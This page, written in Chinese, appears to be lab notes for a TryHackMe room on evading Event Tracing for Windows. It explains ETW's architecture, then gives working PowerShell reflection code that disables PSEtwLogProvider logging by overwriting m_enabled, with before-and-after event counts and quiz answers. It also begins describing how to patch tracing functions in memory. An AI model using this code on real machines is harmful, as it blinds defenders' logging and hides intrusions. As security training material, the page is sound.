title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>哪个事件 ID 记录了日志文件被清除的操作？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">104</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="tracing-instrumentation---事件跟踪仪器">Tracing Instrumentation - 事件跟踪仪器<a href="#tracing-instrumentation---事件跟踪仪器" class="hash-link" aria-label="Direct link to Tracing Instrumentation - 事件跟踪仪器" title="Direct link to Tracing Instrumentation - 事件跟踪仪器">​</a></h2>
<p>ETW 被分为三个独立的组件，这些组件协同工作以管理和关联数据。Windows 中的事件日志与通用的 XML 数据没有什么不同，因此处理和解释起来非常容易。</p>
<p><strong>事件控制器</strong>用于构建和配置会话。为了进一步扩展这个定义，我们可以将控制器视为一个决定数据流向和存储位置的应用程序。从<a href="https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing#controllers" target="_blank" rel="noopener noreferrer">微软文档</a>中可以看到，“控制器是定义日志文件大小和位置、启动和停止事件跟踪会话、启用提供程序以便它们能够向会话记录事件、管理缓冲池大小，并获取会话执行统计信息的应用程序。”</p>
<p><strong>事件提供程序</strong>用于生成事件。为了进一步扩展这个定义，控制器会告诉提供程序如何操作，然后从其指定的源收集日志。从<a href="https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing#providers" target="_blank" rel="noopener noreferrer">微软文档</a>中可以看到，“提供程序是包含事件跟踪仪器的应用程序。提供程序注册后，控制器可以启用或禁用提供程序中的事件跟踪。提供程序定义了启用或禁用的解释。通常，启用的提供程序会生成事件，而禁用的提供程序不会。”</p>
<p>此外，还有四种不同类型的提供程序，支持各种功能和遗留系统。</p>
<table><thead><tr><th><strong>提供程序</strong></th><th><strong>用途</strong></th></tr></thead><tbody><tr><td>MOF (托管对象格式)</td><td>定义来自 MOF 类的事件。每次只能通过一个跟踪会话启用。</td></tr><tr><td>WPP (Windows 软件跟踪预处理器)</td><td>与<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/trace-message-format-file" target="_blank" rel="noopener noreferrer">TMF</a>文件相关，用于解码信息。每次只能通过一个跟踪会话启用。</td></tr><tr><td>基于清单的</td><td>定义来自清单的事件。最多可以通过八个跟踪会话启用。</td></tr><tr><td>TraceLogging</td><td>自描述事件，包含所有所需信息。最多可以通过八个跟踪会话启用。</td></tr></tbody></table>
<p><strong>事件消费者</strong>用于解释事件。为了进一步扩展这个定义，消费者会选择会话并解析来自该会话或多个会话的事件。最常见的就是在“<em>事件查看器</em>”中看到。从<a href="https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing#consumers" target="_blank" rel="noopener noreferrer">微软文档</a>中可以看到，“消费者是选择一个或多个事件跟踪会话作为事件来源的应用程序。消费者可以同时请求来自多个事件跟踪会话的事件；系统按时间顺序交付事件。消费者可以接收存储在日志文件中的事件，或来自实时交付事件的会话。”</p>
<p>这三个组件可以结合在一起，全面理解和描绘 ETW 中的数据/会话流动。</p>
<p><img decoding="async" loading="lazy" alt="Diagram depicting the interaction between ETW components, verbally described in the paragraph below" src="/PgUp-code.github.io/assets/images/dc8217f5aecbcc08d609c3299756da08-2c70ce5a1cdb7227757e5b659402274a.png" width="881" height="361" class="img_ev3q"></p>
<p>从开始到结束，事件都源自提供程序。控制器将确定数据的发送位置以及如何通过会话进行处理。消费者将保存或传送日志以供解释或分析。</p>
<p>现在我们了解了 ETW 如何进行仪器化，那么这与攻击者有什么关系呢？我们之前提到过，目标是限制可见性，同时保持完整性。我们可以通过针对组件来限制特定方面的洞察力，同时保持大部分数据流动。下面是一个简要的列表，列出了针对每个 ETW 组件的具体技术。</p>
<table><thead><tr><th><strong>组件</strong></th><th><strong>技术</strong></th></tr></thead><tbody><tr><td>提供程序</td><td>PSEtwLogProvider 修改、组策略接管、日志管道滥用、类型创建</td></tr><tr><td>控制器</td><td>补丁 EtwEventWrite、运行时跟踪篡改</td></tr><tr><td>消费者</td><td>日志破坏、日志篡改</td></tr></tbody></table>
<p>我们将在接下来的任务中深入探讨每种技术，为您提供一个丰富的工具箱，涵盖各种可能性。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="reflection-for-fun-and-silence---反射乐趣与沉默">Reflection for Fun and Silence - 反射：乐趣与沉默<a href="#reflection-for-fun-and-silence---反射乐趣与沉默" class="hash-link" aria-label="Direct link to Reflection for Fun and Silence - 反射：乐趣与沉默" title="Direct link to Reflection for Fun and Silence - 反射：乐趣与沉默">​</a></h2>
<p>在 PowerShell 中，ETW 提供程序通过一个 <strong>.NET 程序集</strong>：<code>PSEtwLogProvider</code> 加载到会话中。从 <a href="https://docs.microsoft.com/en-us/dotnet/standard/assembly/" target="_blank" rel="noopener noreferrer">Microsoft 文档</a> 中可以看到，“程序集是 .NET 基于应用程序的部署、版本控制、重用、激活范围和安全权限的基本单元。” .NET 程序集可能看起来比较陌生，但通过知道它们的形式，我们可以使其更容易理解。它们的形式通常是我们熟悉的文件类型，如 exe（可执行文件）或 dll（动态链接库）。</p>
<p>在 PowerShell 会话中，大多数 .NET 程序集在启动时会以与用户相同的安全上下文加载。由于会话与加载的程序集具有相同的特权级别，我们可以通过 PowerShell 反射修改程序集的字段和值。从 <a href="https://www.oreilly.com/library/view/professional-windows-powershell/9780471946939/9780471946939_using_.net_reflection.html" target="_blank" rel="noopener noreferrer">O&#x27;Reilly</a> 中可以得知，“反射允许您查看程序集内部并找出它的特性。在 .NET 程序集中，存储了描述程序集内容的信息。这称为元数据。从某种意义上讲，.NET 程序集是自描述的，至少如果正确询问的话。”</p>
<p>在 <strong>ETW</strong>（<strong>E</strong>vent <strong>T</strong>racing for <strong>W</strong>indows）的背景下，攻击者可以反射 ETW 事件提供程序程序集，并将 <code>m_enabled</code> 字段设置为 <code>$null</code>。</p>
<p>从高层次来看，PowerShell 反射可以分为四个步骤：</p>
<ol>
<li>获取 <code>PSEtwLogProvider</code> 程序集的类型。</li>
<li>为 <code>etwProvider</code> 字段存储一个 <code>null</code> 值。</li>
<li>将 <code>m_enabled</code> 字段设置为先前存储的值。</li>
</ol>
<p>在第一步中，我们需要获取 <code>PSEtwLogProvider</code> 程序集的类型。该程序集被存储以便在下一步访问其内部字段。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$logProvider = [Ref].Assembly.GetType(&#x27;System.Management.Automation.Tracing.PSEtwLogProvider&#x27;)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在第二步中，我们从先前的程序集存储一个值（<code>$null</code>），以便在后续步骤中使用。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$etwProvider = $logProvider.GetField(&#x27;etwProvider&#x27;,&#x27;NonPublic,Static&#x27;).GetValue($null)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在第三步中，我们将之前的步骤组合在一起，将 <code>m_enabled</code> 字段覆盖为在前一步存储的值（<code>$null</code>）。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[System.Diagnostics.Eventing.EventProvider].GetField(&#x27;m_enabled&#x27;,&#x27;NonPublic,Instance&#x27;).SetValue($etwProvider,0);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>我们可以将这些步骤编译在一起，并将其附加到恶意 PowerShell 脚本中。使用提供的 PowerShell 脚本并尝试此技术。</p>
<p>为了证明脚本的有效性，我们可以执行它并衡量给定命令返回的事件数量。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\Users\Administrator&gt; Get-WinEvent -FilterHashtable @{ProviderName=&quot;Microsoft-Windows-PowerShell&quot;; Id=4104} | Measure | % Count</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\Users\Administrator&gt; whoami</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Tryhackme\administrator</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\Users\Administrator&gt; Get-WinEvent -FilterHashtable @{ProviderName=&quot;Microsoft-Windows-PowerShell&quot;; Id=4104} | Measure | % Count</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">11</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>👇</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\Users\Administrator&gt;.\reflection.ps1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\Users\Administrator&gt; Get-WinEvent -FilterHashtable @{ProviderName=&quot;Microsoft-Windows-PowerShell&quot;; Id=4104} | Measure | % Count</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">18</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\Users\Administrator&gt; whoami</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Tryhackme\administrator</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\Users\Administrator&gt; Get-WinEvent -FilterHashtable @{ProviderName=&quot;Microsoft-Windows-PowerShell&quot;; Id=4104} | Measure | % Count</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">18</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在第一个终端中，当运行 <code>whoami</code> 命令时，会生成四个事件。执行脚本后，在第二个终端中运行命令时，未生成任何事件。从这个对比中，我们还可以看到 PowerShell 脚本创建了七个事件；在评估这种方法时，应该考虑到这一点。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>使用的反射程序集是什么？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PSEtwLogProvider</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>哪个字段被覆盖以禁用ETW？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">m_enabled</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="patching-tracing-functions---补丁跟踪函数">Patching Tracing Functions - 补丁跟踪函数<a href="#patching-tracing-functions---补丁跟踪函数" class="hash-link" aria-label="Direct link to Patching Tracing Functions - 补丁跟踪函数" title="Direct link to Patching Tracing Functions - 补丁跟踪函数">​</a></h2>
<p>ETW 是从每个新进程的运行时加载的，通常源自 <strong>CLR</strong>（<strong>C</strong>ommon <strong>L</strong>anguage <strong>R</strong>untime）。在一个新进程中，ETW 事件会从用户空间发送，并直接从当前进程发出。攻击者可以通过向 ETW 的内存中的函数写入预定义的操作码来打补丁并禁用功能。在深入探讨这一技术的具体细节之前，我们先来观察一下补丁操作的高级概念。在最基本的定义中，我们试图强制一个应用程序退出或在到达我们想要打补丁的函数之前就返回。</p>
<p>为了更好地理解这个概念，我们创建了一个基本的伪函数，它将执行数学运算并返回一个整数。如果在原始返回之前插入一个返回语句，那么程序将不会完成随后的行操作。</p>
<div class="language-csharp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-csharp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">int x = 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">int y = 3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">return x + y</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// output: 4  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">int x = 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">return  x</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">int y = 3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">return x + y</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// output: 1 </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="Diagram depicting the LIFO structure. Something is pushed to the top then when taken out the last item put in is popped out" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAf8AAAEPCAYAAABMY82nAAAAAXNSR0IArs4c6QAABe10RVh0bXhmaWxlACUzQ214ZmlsZSUyMGhvc3QlM0QlMjJhcHAuZGlhZ3JhbXMubmV0JTIyJTIwbW9kaWZpZWQlM0QlMjIyMDIyLTAzLTIyVDE0JTNBMDclM0ExMy41MzhaJTIyJTIwYWdlbnQlM0QlMjI1LjAlMjAoV2luZG93cyUyME5UJTIwMTAuMCUzQiUyMFdpbjY0JTNCJTIweDY0KSUyMEFwcGxlV2ViS2l0JTJGNTM3LjM2JTIwKEtIVE1MJTJDJTIwbGlrZSUyMEdlY2tvKSUyMENocm9tZSUyRjk5LjAuNDg0NC43NCUyMFNhZmFyaSUyRjUzNy4zNiUyMiUyMGV0YWclM0QlMjJwakl6MC1pOW82anlQTmxrQ21yTCUyMiUyMHZlcnNpb24lM0QlMjIxNy4xLjMlMjIlM0UlM0NkaWFncmFtJTIwaWQlM0QlMjI5SVJ0LVRpVkdqYXZLQzlkbUZqbyUyMiUyMG5hbWUlM0QlMjJQYWdlLTElMjIlM0U1VmpaY3Bzd0ZQMGFIdE14Q0lMOTZLM0pkTnFwTzI2blNWNDZDaWlnUmlDUGtCZnk5WldNeENMc3hFMmNVaWRQNkY1ZFhhUnpqbFlMakpQTkJZT0wlMkJBc05FYkdjWHJpeHdNUnlIQnNNZlBHUm5yenclMkJGNnZjRVFNaHlxb2NzenhBMUpPSGJiRUljb2FnWnhTd3ZHaTZReG9tcUtBTjN5UU1icHVodDFSMHZ6ckFrYW81WmdIa0xTOVAzSEk0OExiMTZPUSUyRmt1RW8xaiUyRjJlNnBtZ1RxWU9YSVloalNkYzBGcGhZWU0wcDVVVW8yWTBRa2VCcVhvdDNIUGJWbHh4aEslMkJTRU5Qa1ZlZWp0T2JwTGhMODglMkI4MmZmTGdMbnpDdXlyQ0JacWdHcnp2SmNJOERvTWcyUlROS3p3R2dkWTQ3bUN4akkyclhnWFBoaW5oQmgyYUpZRGxMRzNtRkN4cFJRdGswRWhvT3hPeDBKdiUyRm9uWWh4dDlnN0dMaUVTMmtJMFFaemxJa1ExQUJwVkpTdEh3NzZ1U0xKMVRGd2p5RlUlMkJxSFFSbGFrcjZFUkJvZmNYU1BwdkJVbTNheVQ3YndYSmZ0ZElEdDRJa3FYZEdaSjZPenA5S004N2g5SSUyQlVTamQ4JTJGOXR6N0dkRTRXeWhFNUJhWGV2U3RDQ2N2WmpmdG1DVTR5Wk56R0RCRWVwS0FkaTdFaGdOWkxJWUhHQ0hLcUtCSWVoYkQ1aUtNTVA4SGFiU2dLOG9EamwyNEY0STh1YnlGeExUclBpREx5bGd6TjZqelFIS1UyUlFZdHlIWU1SWURBQzJveDRPd2h4WG8wUXQwM0kxOW03NGNNelo0amY1c1A5cDN3Y2NNQU5sbXkxWFdva1dDZ05oJTJGSUNKcWtnTU10dzBPU3B1VEFKV0ZoJTJCVlRldXBmSEIwJTJCWmtVNiUyQmM1TXJLN2hFUFltVVVIVUpoNjBwbm9DN3VrSkJGaUQlMkI1dExicGVXSTZhQjlEQkhLOGF2WmpGeWZxRHpNcHZZcDkzeUMlMkZiN0NhMFNVTGtHcFV2JTJGTVplV3h6Vm50R29nS0hWaUpCSE14cllXcG03TzN2WVBkeXZyZGJ4azVxdTQxNFVTZzZVS20xWk9BRkFqN2dYdEcxZ05FRzg2dXFtYkN1YXpWVkJtbm9CSWVMdmxETkl4QjVYV29lbUtJZlBGUDByYVhUVEhRazBRTlQ5ZjdqcWpmUGozb3l2cXJxeTllblN1UlNLbk5sVXNaakd0RVVrbW5sTlpUZFVHalY0RE9sQ3pVVGZpUE9jJTJGVjJKN2ZNNWp4NTdzdzRvckR0d1lITCUyRnA0WmNMQzBYN2JGdHUlMkZyM3dYRzclMkJYSVkxNEt5amZnMnZvRGpuUGtFV2IxOEZwTXRlcjVHa3olMkZBQSUzRCUzRCUzQyUyRmRpYWdyYW0lM0UlM0MlMkZteGZpbGUlM0UT9IT7AAAeg0lEQVR4Xu2de8xsZ1WHfwVRwRCVoiFGw8VLQVGMMaK2RLwBclERpWKLiqIgYKHiJV5KiyggQlAshuIFEYoeFKy1EESUACVE/5CLCVpJABWMkQIJECoXPWZx3q9Mp985s2dmrT1rr/VMckI438zaaz2/t+f59sze75wlHhCAAAQgAAEItCJwVqtpGRYCEIAABCAAASF/FgEEIAABCECgGQHk3yxwxoUABCAAAQggf9YABCAAAQhAoBkB5N8s8IWOe46kE5Lusdb/hZKulGQ/f46kiyRdt/KcSyS9czzH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